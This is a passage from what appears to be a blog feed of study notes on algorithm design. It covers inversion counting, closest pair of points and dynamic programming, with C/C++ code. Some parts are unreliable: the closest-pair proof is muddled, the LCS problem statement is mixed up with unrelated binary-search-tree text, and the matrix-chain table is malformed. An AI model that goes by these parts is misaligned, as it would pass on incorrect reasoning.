<h3 id="algorithm-and-approach-3">3.4.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li>Divide: Split the original array A into two equal parts</li>
<li>Conquer: If a subarray contains only one element, it don‚Äôt include
the inversion pairs; Otherwise, recursively divide the subarrays
further</li>
<li>Merge: The approach is divided into three main components (C1, C2,
and C3), and the total inversion count C is the sum of these components:
<span class="math inline">\(*C=C_1+C_2+C_3*\)</span>
<ul>
<li>C1: Inversions within the left segment of the array</li>
<li>C2: Inversions within the right segment of the array</li>
<li>C3: Inversions across the two segments</li>
</ul></li>
</ul>
<aside>
<p>üí°</p>
<p>How to compute C3? The key insight is to use the merge process of
merge sort.</p>
</aside>
<figure>
<img src="attachment:1a8628fe-59b6-48c3-aaab-6bfcdd8f1d29:image.png"
alt="easy to understand explanation" />
<figcaption aria-hidden="true">easy to understand
explanation</figcaption>
</figure>
<p>easy to understand explanation</p>
<h3 id="code-example-3">3.4.3 <strong>Code Example</strong></h3>
<p>main:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">reverseOrderPairs</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iBuffer[], <span class="type">int</span> iLow, <span class="type">int</span> iHigh)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (iLow == iHigh) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Base case: single element</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> iMid = (iLow + iHigh) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">long</span> C1, C2, C3;</span><br><span class="line"></span><br><span class="line">    C1 = reverseOrderPairs(iDatas, iBuffer, iLow, iMid); <span class="comment">// Count inversions in the left segment</span></span><br><span class="line">    C2 = reverseOrderPairs(iDatas, iBuffer, iMid + <span class="number">1</span>, iHigh); <span class="comment">// Count inversions in the right segment</span></span><br><span class="line">    C3 = MergeReverse(iDatas, iBuffer, iLow, iMid, iHigh); <span class="comment">// Count inversions across segments</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = iLow; i &lt;= iHigh; i++) <span class="comment">// Copy back the sorted result to the original array</span></span><br><span class="line">        iDatas[i] = iBuffer[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> C1 + C2 + C3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>merge step:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Merge the segments iData[iLow:iMid] and iData[iMid+1:iHigh] into iBuffer[iLow:iHigh],</span></span><br><span class="line"><span class="comment">// and count the number of inversions within the merged segments</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">MergeReverse</span><span class="params">(<span class="type">int</span> iDatas[], <span class="type">int</span> iBuffer[], <span class="type">int</span> iLow, <span class="type">int</span> iMid, <span class="type">int</span> iHigh)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = iLow, j = iMid + <span class="number">1</span>, k = iLow;</span><br><span class="line">    <span class="type">long</span> iCrossPairs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= iMid &amp;&amp; j &lt;= iHigh) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iDatas[i] &lt;= iDatas[j]) &#123;</span><br><span class="line">            iBuffer[k++] = iDatas[i++];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Count inversion pairs: if iDatas[i] &gt; iDatas[j], all remaining elements in the left segment</span></span><br><span class="line">            <span class="comment">// from i to iMid form inversion pairs with iDatas[j]</span></span><br><span class="line">            iCrossPairs += iMid - i + <span class="number">1</span>;</span><br><span class="line">            iBuffer[k++] = iDatas[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i &lt;= iMid) <span class="comment">// Copy remaining elements in the left segment [iLow:iMid]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> ii = i; ii &lt;= iMid; ii++)</span><br><span class="line">            iBuffer[k++] = iDatas[ii];</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// Copy remaining elements in the right segment [iMid+1:iHigh]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> jj = j; jj &lt;= iHigh; jj++)</span><br><span class="line">            iBuffer[k++] = iDatas[jj];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> iCrossPairs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="binary-search">3.5 Binary Search</h2>
<p>Any given set containing n integers, and n integers have been
arranged in ascending order. Given any integer k, judge whether the
integer is in the set. classic divide and conquer problem(‚ùåmerge
step)</p>
]]></content>
      <categories>
        <category>Algorithm Design and Analysis</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>ü•Ω Divide and Conquer(The closest pairs of points)</title>
    <url>/2025/02/24/Divide-and-Conquer-The-closest-pairs-of-points/</url>
    <content><![CDATA[<h1 id="problem-statement">1. <strong>Problem Statement</strong></h1>
<p>Given a set of ( n ) points on a 2D plane, find a pair of points such
that the distance between them is the minimum among all possible pairs
of points in the set.</p>
<span id="more"></span>
<p><strong>Input:</strong></p>
<ul>
<li>Each test case begins with a single integer ( n ), representing the
number of points on the plane.</li>
<li>This is followed by ( n ) lines (where ( n &lt; 100,000 )), each
containing two integers representing the x-coordinate and y-coordinate
of a point.</li>
<li>The input ends with a line containing -1, indicating the end of all
test cases.</li>
</ul>
<p><strong>Output:</strong></p>
<ul>
<li>For each test case, output a single line containing the distance
between the closest pair of points, rounded to an appropriate precision
(typically an integer or with a specific number of decimal places,
depending on the problem‚Äôs requirements).</li>
</ul>
<p><strong>Sample Input:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">0 0</span><br><span class="line">0 1</span><br><span class="line">0 8</span><br><span class="line">-1</span><br></pre></td></tr></table></figure>
<p><strong>Sample Output:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>
<h1 id="algorithm-and-approach">2. <strong>Algorithm and
Approach</strong></h1>
<ul>
<li><p>Divide: Choose a vertical line <span class="math inline">\(l: x =
m\)</span> as the dividing line, where m is the median of the
x-coordinates of the points in <span class="math inline">\(S\)</span> .
Split <span class="math inline">\(S\)</span> into <span
class="math inline">\(S_1\)</span> and <span
class="math inline">\(S_2\)</span> .</p></li>
<li><p>Conquer: Recursively find the minimum distances d_1 and d_2 in
S_1 and S_2 , respectively, and set d = {d_1, d_2} .</p>
<aside>
<p>üí°</p>
<p>Compress the enumeration space</p>
</aside></li>
</ul>
<figure>
<img src="attachment:7b36543f-3a54-43fe-815f-b8fec41f7897:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li>Merge: The closest pair of points in S is either d or a pair {p, q}
where p S_1 and q S_2 .
<ul>
<li><p>Candidate points p and q must be within a distance of at most d
from the line l , so only the ranges P_1 and P_2 need to be
considered.</p></li>
<li><p>For any point p in P_1 , if it forms a candidate for the closest
pair with a point q in P_2 , then it must satisfy: (p, q) &lt; d. The
points in P_2 that meet this condition must lie within a d 2d rectangle
R .</p></li>
<li><p>From the definition of d , we know that any two points in S
within P_2 are at least d apart. Therefore, it follows that there can be
at most 6 points from S within the rectangle R . <strong>Proof:</strong>
In the 2D space ( R^2 ), there are ( 2d ) points divided into two sets
of ( d ) points each, labeled as the left set and the right set. We can
assume there is at least one point pair ((d/2) (2d/3)) that forms the
closest pair. The space ( R^2 ) has 6 strips of ( S ), and by combining
the results of these strips, we can identify a unique point pair ((d/2)
(2d/3)) where there are 2 points within ( S ) that are the closest. Let
( u ) and ( v ) be two points in one of the 6 strips of ( S ), and:</p>
<p>The distance between the two points satisfies: [ (x(u) - x(v))^2 +
(y(u) - y(v))^2 (d/2)^2 + (2d/3)^2 = d^2 ] Thus, the distance (
distance(u, v) &lt; d ). This completes the proof of the geometric
reasoning.</p></li>
</ul></li>
</ul>
<h1 id="code-example">3. <strong>Code Example</strong></h1>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ÊúÄËøëÁÇπÂØπ</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y second</span></span><br><span class="line"></span><br><span class="line">PII p[N];</span><br><span class="line">PII temp[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">//ËÆ°ÁÆó‰∏§ÁÇπ‰πãÈó¥ÁöÑÊ¨ßÂá†ÈáåÂæóË∑ùÁ¶ª</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">dist</span><span class="params">(PII a, PII b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">dis</span><span class="params">(<span class="type">int</span> iLow, <span class="type">int</span> iHigh)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(iLow&gt;=iHigh)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1e9</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(iLow+<span class="number">1</span>==iHigh)&#123;</span><br><span class="line">        <span class="keyword">return</span> dist(p[iLow], p[iHigh]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> iMid=(iLow+iHigh)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="type">double</span> l_dis=dis(iLow,iMid);</span><br><span class="line">        <span class="type">double</span> r_dis=dis(iMid+<span class="number">1</span>,iHigh);</span><br><span class="line">        <span class="type">double</span> d=min(l_dis,r_dis);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=iLow;i&lt;=iHigh;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">fabs</span>(p[i].x-p[iMid].x)&lt;d)&#123;</span><br><span class="line">                temp[t]=p[i];</span><br><span class="line">                t++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sort(temp,temp+t);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;t;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;t;j++)&#123;</span><br><span class="line">                d=min(d,dist(temp[i],temp[j]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;p[i].x&gt;&gt;p[i].y;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(p,p+n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>, dis(<span class="number">0</span>,n<span class="number">-1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reduction-strategy">4. Reduction strategy</h1>
<blockquote>
<p>In a divide-and-conquer algorithm, if a certain (or some) subproblem
is irrelevant to the solution of the original problem or identical to
another subproblem, then this (or these) subproblem(s) do not need to be
solved recursively and can be directly discarded or replaced with an
existing result.</p>
</blockquote>
]]></content>
      <categories>
        <category>Algorithm Design and Analysis</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>ü•ºDynamic Programming</title>
    <url>/2025/02/26/Dynamic-Programming/</url>
    <content><![CDATA[<h1 id="the-main-idea-of-dynamic-programming-algorithm">1. The main idea
of Dynamic Programming algorithm</h1>
<h2 id="prologuenumber-triangle-path-problem">1.1
Prologue‚Äî‚Äî<strong>Number Triangle Path Problem</strong></h2>
<p>Given an isosceles right-angled number triangle, write a program to
compute a path from the top to a specific position at the bottom such
that the sum of the numbers along the path is maximized. It is assumed
that at each step, one can move either straight down or diagonally down
to the right. <span id="more"></span></p>
<ul>
<li>a[i][j] represents the number at row i and column j</li>
<li>opt[i][j] records the maximum total sum of a path from the top to
the position at row i , column j</li>
</ul>
<ol type="1">
<li><span class="math inline">\(j=1\)</span> <span
class="math inline">\(opt[i][j] = a[i][j] + opt[i-1][j]\)</span></li>
<li><span class="math inline">\(j &gt; 1\)</span> <span
class="math inline">\(opt[i][j] = a[i][j] + max(opt[i-1][j],
opt[i-1][j-1])\)</span></li>
</ol>
<p>result: max{<span class="math inline">\(opt[N][i], 1 &lt;= i &lt;=
N\)</span>}</p>
<h2 id="background">1.2 Background</h2>
<p>Dynamic programming is a branch of operations research. In the early
1950s, the American mathematician R.E. Bellman and others proposed the
famous <strong>principle of optimality</strong> while studying
optimization problems in <strong>multistep decision processes</strong>.
This principle transforms a multistage process into a series of
single-stage problems and solves them sequentially by leveraging the
relationships between stages. This led to the development of a new
method for solving such optimization problems‚Äî<strong>dynamic
programming</strong>.</p>
<h2 id="important-definition">1.3 Important Definition</h2>
<ul>
<li><strong>State Representation:</strong> Represents the
<strong>objective situation</strong> of the problem or system at the
beginning of each stage. A stage may have multiple states, each
represented as a tuple <strong>S(p‚ÇÅ, p‚ÇÇ, ‚Ä¶, p‚Çñ)</strong>:
<strong>Parameters</strong> describe state attributes. <strong>Value
domain</strong> represents state values or subproblem
<strong>answers</strong>. Like: <span class="math inline">\(opt(i,
j)\)</span></li>
<li><strong>State Transition:</strong> In a <strong>multistage decision
process</strong>, a decision sequence corresponds to a sequence of
states, with each decision leading to a <strong>state
transition</strong>. State transitions are described using a
<strong>recursive equation</strong>, referred to as the <strong>state
transition equation</strong>. Like: <span class="math inline">\(opt(i,
j) = a[i][j] + max(opt(i-1,j), opt(i-1,j-1))\)</span>
<ul>
<li><strong>State Independence (No Aftereffect Property):</strong> Once
the state of a certain stage is determined, the future development of
this stage is <strong>independent</strong> of the states of all previous
stages.</li>
<li><strong>Principle of Optimality:</strong> A sub-strategy sequence of
an <strong>optimal strategy sequence</strong> must always be
<strong>optimal</strong> itself.</li>
</ul></li>
</ul>
<h1
id="typical-application-examples-of-dynamic-programming-algorithm">2.
Typical application examples of Dynamic Programming algorithm</h1>
<h2 id="matrix-multiplication-problem">2.1 Matrix multiplication
problem</h2>
<h3 id="problem-statement">2.1.1 <strong>Problem Statement</strong></h3>
<p><strong>Problem Description:</strong></p>
<p>Consider the multiplication of two matrices: <strong>C = A √ó
B</strong>. If matrix <strong>A</strong> has dimensions <strong>p √ó
r</strong> and matrix <strong>B</strong> has dimensions <strong>r √ó
q</strong>, then their product <strong>C</strong> will be a <strong>p √ó
q</strong> matrix, where each element <strong>(i, j)</strong> is given
by. Thus, the number of scalar multiplications required for computing
<strong>AB</strong> is <strong>p √ó r √ó q</strong>.</p>
<p>If there are at least <strong>three</strong> matrices being
multiplied together, the <strong>order of multiplication</strong>
affects the total number of computations. For example, for three
matrices, there are two possible ways to insert parentheses:</p>
<ol type="1">
<li><p><strong>((A‚ÇÅ √ó A‚ÇÇ) √ó A‚ÇÉ)</strong></p></li>
<li><p><strong>(A‚ÇÅ √ó (A‚ÇÇ √ó A‚ÇÉ))</strong></p></li>
</ol>
<p>Let <strong>A‚ÇÅ, A‚ÇÇ, A‚ÇÉ</strong> have dimensions <strong>p‚ÇÄ √ó p‚ÇÅ, p‚ÇÅ √ó
p‚ÇÇ, p‚ÇÇ √ó p‚ÇÉ</strong>, respectively. The number of scalar multiplications
for each order is: <strong>((A‚ÇÅ √ó A‚ÇÇ) √ó A‚ÇÉ); (A‚ÇÅ √ó (A‚ÇÇ √ó
A‚ÇÉ))</strong>.</p>
<p>The goal is to find the <strong>optimal parenthesization</strong> for
<strong>n</strong> given matrices <strong>A‚ÇÅ, A‚ÇÇ, ‚Ä¶, A‚Çô</strong>, with
dimensions <strong>p‚ÇÄ √ó p‚ÇÅ, p‚ÇÅ √ó p‚ÇÇ, ‚Ä¶, p‚Çô‚Çã‚ÇÅ √ó p‚Çô</strong>, such that
the <strong>total number of scalar multiplications is
minimized</strong>.</p>
<h3 id="algorithm-and-approach">2.1.2 <strong>Algorithm and
Approach</strong></h3>
<aside>
<p>üí°</p>
<p>State representation is essentially a parameterized description of
subproblems.</p>
</aside>
<ul>
<li><p><strong>State Transition:</strong></p>
<p><span class="math inline">\(A[i][j]\)</span>the number of
multiplications corresponding to the optimal computation order: <span
class="math inline">\(m(i,j)\)</span></p></li>
</ul>
<aside>
<p>üí°</p>
<p>It establishes the relationship between the optimal solution of the
original problem and the optimal solutions of its subproblems.</p>
</aside>
<ul>
<li><p><strong>State Transition:</strong></p>
<p>Given n rectangles <span class="math inline">\(A‚ÇÅ, ‚Ä¶, A‚Çô\)</span>,
where each rectangle‚Äôs side length is <span
class="math inline">\(p_{i-1} √ó p_i\)</span>, and one of their complete
doubling square schemes:</p>
<p>((A‚ÇÅ, A‚ÇÇ, ‚Ä¶, A‚Çñ)) ((A‚Çñ‚Çä‚ÇÅ, A‚Çñ‚Çä‚ÇÇ, ‚Ä¶, A‚Çô)) : <span
class="math inline">\(a\)</span></p>
<p>(A‚ÇÅ, A‚ÇÇ, ‚Ä¶, A‚Çñ): <span class="math inline">\(b\)</span></p>
<p>((A‚Çñ‚Çä‚ÇÅ, A‚Çñ‚Çä‚ÇÇ, ‚Ä¶, A‚Çô)): <span class="math inline">\(c\)</span></p>
<p><span class="math inline">\(a = b + c + P_0P_kP_n\)</span></p>
<p><strong>a</strong> ‚Äî is not the optimal value!!</p>
<p>If <strong>a</strong> is the optimal value, what about
<strong>b</strong> and <strong>c</strong>?</p>
<p><strong>provement:</strong></p>
<p>Construct another doubling square scheme for the original
problem,</p>
<p><span class="math inline">\(a&#39; = b&#39; + c + P_0P_kP_n\)</span>
<span class="math inline">\(a = b + c + P_0P_kP_n\)</span> <span
class="math inline">\(b&#39; &lt; b\)</span></p>
<p>so, <span class="math inline">\(a&#39; &lt; a\)</span></p></li>
</ul>
<p><span
class="math inline">\(m(i,j)=m(i,k)+m(k+1,j)+P_{i-1}P_kP_{j}\)</span>,
so <span class="math inline">\(m(i, j) =
\begin{cases}
0 &amp; \text{if } i = j \\
\min_{i \leq k &lt; j} \{ m(i, k) + m(k + 1, j) + p_{i-1} p_k p_j \}
&amp; \text{if } i &lt; j
\end{cases}\)</span></p>
<p><strong>Example:</strong></p>
<table>
<thead>
<tr>
<th>A1=(a0a1)</th>
<th>A2=(a1a2)</th>
<th>A3=(a2a3)</th>
<th>A4</th>
<th>A5</th>
<th>A6</th>
</tr>
</thead>
<tbody>
<tr>
<td>30√ó35</td>
<td>35√ó15</td>
<td>15√ó5</td>
<td>5√ó10</td>
<td>10√ó20</td>
<td>20√ó25</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th></th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>0</td>
<td>15750=(a0a1a2)</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>s=1</td>
<td>7875</td>
<td>9375</td>
<td>11875</td>
<td>15125</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td>0</td>
<td><strong>2625</strong>=(a1a2a3)</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>s=2</td>
<td>4375</td>
<td>7125</td>
<td>10500</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td></td>
<td></td>
<td>0</td>
<td>750</td>
<td></td>
<td></td>
</tr>
<tr>
<td>s=3</td>
<td>2500</td>
<td>5375</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td></td>
<td></td>
<td></td>
<td>0</td>
<td>**1000</td>
<td></td>
</tr>
<tr>
<td>s=4**</td>
<td>3500</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>0</td>
<td>5000</td>
</tr>
<tr>
<td>s=5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>0</td>
</tr>
</tbody>
</table>
<h3 id="memoization-method">2.1.3 memoization method</h3>
<blockquote>
<p>The memoization method stores the solutions to solved subproblems in
a table. When the same problem needs to be solved again, the answer can
be retrieved directly from the table without recalculating. If the
solution has not been computed, the recursive solving process is called
to calculate it.</p>
</blockquote>
<h2 id="shortest-path-in-a-multistage-graph">2.2 Shortest Path in a
Multistage Graph</h2>
<h3 id="problem-statement-1">2.2.1 <strong>Problem
Statement</strong></h3>
<p>Let <span class="math inline">\(G = (V, E)\)</span> be a weighted
directed graph, where the vertex set <span
class="math inline">\(V\)</span> is partitioned into <span
class="math inline">\(k\)</span> (with <span class="math inline">\(k
&gt; 2\)</span> ) disjoint subsets <span
class="math inline">\(V_i\)</span> (for <span class="math inline">\(1
\leq i \leq k\)</span> ). The subsets <span
class="math inline">\(V_1\)</span> and <span
class="math inline">\(V_k\)</span> each contain only one vertex, s
(called the source) and t (called the sink), respectively. All edges
(<span class="math inline">\(u, v)\)</span> in the graph have their
start and end vertices in adjacent subsets <span
class="math inline">\(V_i\)</span> and <span
class="math inline">\(V_{i+1}\)</span> , where <span
class="math inline">\(u \in V_i\)</span> , <span class="math inline">\(v
\in V_{i+1}\)</span> , and each edge <span class="math inline">\((u,
v)\)</span> has a positive weight <span class="math inline">\(w(u,
v)\)</span> .</p>
<figure>
<img src="attachment:04240348-eb66-4a0e-9390-1fae26814f6d:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>Design an algorithm to find the minimum weight path from the source
<span class="math inline">\(s\)</span> to the sink <span
class="math inline">\(t\)</span> .</p>
<h3 id="algorithm-and-approach-1">2.2.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li><p><strong>State Representation:</strong> <span
class="math inline">\(\text{d}(s, v(i, p))\)</span> represents the
shortest path length from the source s to the vertex <span
class="math inline">\(v(i, p)\)</span> . <span
class="math inline">\(i\)</span> represents the segment index. <span
class="math inline">\(p\)</span> represents the vertex index within the
<span class="math inline">\(i\)</span> -th segment.</p></li>
<li><p><strong>State Transition:</strong> need the provement</p>
<p><span class="math inline">\(W(i, p) =
  \begin{cases}
  0, &amp; i = 1 \\
  \min_{q \in V_{i-1}, (q, p) \in E} \{ W(i-1, q) + w(q, p) \}, &amp; i
&gt; 1
  \end{cases}\)</span></p></li>
</ul>
<figure>
<img src="attachment:26289fe2-4213-4336-804c-a1642b7fb994:image.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><span class="math inline">\(W[i,p]\)</span> cannot be accessed. Use
the predecessor s<em>s</em> to retrieve the shortest path record <span
class="math inline">\(v(i,p)\)</span></p>
<h2 id="longest-common-subsequence">2.3 Longest Common Subsequence</h2>
<h3 id="problem-statement-2">2.3.1 <strong>Problem
Statement</strong></h3>
<p>Assume there is another set of keys <span class="math inline">\(X =
\{x_1, x_2, \dots, x_m\}\)</span> and <span class="math inline">\(Y =
\{y_1, y_2, \dots, y_n\}\)</span> , which leads to the optimal binary
search tree for this set of keys. suppose <span class="math inline">\(Z
= \{B, C, D, B\}\)</span> is the set of keys <span
class="math inline">\(X = \{A, B, C, B, D, A, B\}\)</span> , and the
probability of the keys under the tree is {2, 3, 5, 7} .</p>
<h3 id="algorithm-and-approach-2">2.3.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li><strong>State Representation: <span class="math inline">\(C(m,
n)\)</span></strong> represents the length of the longest common
subsequence (LCS) of the two original sequences. Val(i, p), 1 ‚â§ i ‚â§ n, 0
‚â§ p ‚â§ C</li>
<li><strong>State Transition:</strong> <span
class="math inline">\(c[i][j] =
\begin{cases}
0 &amp; i = 0, j = 0 \\
c[i - 1][j - 1] + 1 &amp; i, j &gt; 0; x_i = y_j \\
\max\{c[i][j - 1], c[i - 1][j]\} &amp; i, j &gt; 0; x_i \neq y_j
\end{cases}\)</span></li>
</ul>
<h3 id="code-example">2.3.3 <strong>Code Example</strong></h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> strX[<span class="number">100005</span>];</span><br><span class="line"><span class="type">int</span> strY[<span class="number">100005</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> DP[<span class="number">1005</span>][<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DP_memo</span><span class="params">(<span class="type">int</span>* strX, <span class="type">int</span>* strY)</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (strX[i - <span class="number">1</span>] == strY[j - <span class="number">1</span>]) &#123;</span><br><span class="line">				DP[i][j] = DP[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (DP[i - <span class="number">1</span>][j] &gt; DP[i][j - <span class="number">1</span>]) &#123;</span><br><span class="line">				DP[i][j] = DP[i - <span class="number">1</span>][j];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				DP[i][j] = DP[i][j - <span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DP[n][n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="built_in">memset</span>(DP, <span class="number">0</span>, <span class="keyword">sizeof</span>(DP));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;n; i++) &#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; strX[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; strY[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; DP_memo(strX, strY) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="knapsack-problem">2.4 0-1 Knapsack Problem</h2>
<h3 id="problem-statement-3">2.3.1 <strong>Problem
Statement</strong></h3>
<p>Given n items and a knapsack, where the weight of item <span
class="math inline">\(i\)</span> is W<span
class="math inline">\(_i\)</span> and its value is <span
class="math inline">\(V_i\)</span> , and the capacity of the knapsack is
<span class="math inline">\(C\)</span> , the problem is to determine
which items to include in the knapsack in order to maximize the total
value of the items placed in the knapsack.</p>
<h3 id="algorithm-and-approach-3">2.3.2 <strong>Algorithm and
Approach</strong></h3>
<ul>
<li><strong>State Representation:</strong> The subproblem can be
determined by two parameters: the set of items to be considered for
packing and the available capacity of the knapsack. <span
class="math inline">\(Val(i, p), 1 ‚â§ i ‚â§ n, 0 ‚â§ p ‚â§ C\)</span> This
represents the maximum value that can be achieved with the capacity of
